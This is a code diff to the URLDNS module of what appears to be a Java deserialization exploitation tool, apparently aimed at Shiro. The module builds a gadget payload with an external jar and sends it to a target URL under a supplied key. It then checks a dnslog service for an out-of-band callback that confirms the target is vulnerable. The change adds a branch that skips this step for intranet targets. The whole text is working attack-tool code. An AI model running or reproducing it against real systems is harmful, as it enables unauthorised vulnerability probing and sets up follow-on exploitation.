@@ -23,29 +23,32 @@ class URLDNS(object):
 
 
     def sendPayload(self,url,command,resKey,func,fp=JAR_FILE):
-        dnslog = func[0]
-        phpsessid = func[1]
-        checkUrl = "http://urldns.{}".format(dnslog)
-
-        if not os.path.exists(fp):
-            raise Exception('jar file not found!')
-        checkUrlPopen = subprocess.Popen(['java', '-jar', fp, 'URLDNS', checkUrl],       #popen
-                                    stdout=subprocess.PIPE)
-
-
-        status = self.sendCommand(url,resKey,checkUrlPopen)
- 
-        if(status==200):
-            print("[+]   ****URLDNS模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(status)))
+        if '内网环境' in func:
+            pass
         else:
-            print("[-]   ****URLDNS模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(status)))
+            dnslog = func[0]
+            phpsessid = func[1]
+            checkUrl = "http://urldns.{}".format(dnslog)
 
-        check = self.checkDnslogResult(phpsessid)
-        
-        if check:
-            print("[+]   ****目标环境是否存在此利用链(此链无法执行命令,仅供验证): YES")
-        else:
-            print("[+]   ****目标环境是否存在此利用链: NO")
+            if not os.path.exists(fp):
+                raise Exception('jar file not found!')
+            checkUrlPopen = subprocess.Popen(['java', '-jar', fp, 'URLDNS', checkUrl],       #popen
+                                        stdout=subprocess.PIPE)
+
+
+            status = self.sendCommand(url,resKey,checkUrlPopen)
+    
+            if(status==200):
+                print("[+]   ****URLDNS模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(status)))
+            else:
+                print("[-]   ****URLDNS模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(status)))
+
+            check = self.checkDnslogResult(phpsessid)
+            
+            if check:
+                print("[+]   ****目标环境是否存在此利用链(此链无法执行命令,仅供验证): YES")
+            else:
+                print("[+]   ****目标环境是否存在此利用链: NO")
 
 
     def sendCommand(self,url,resKey,popen):
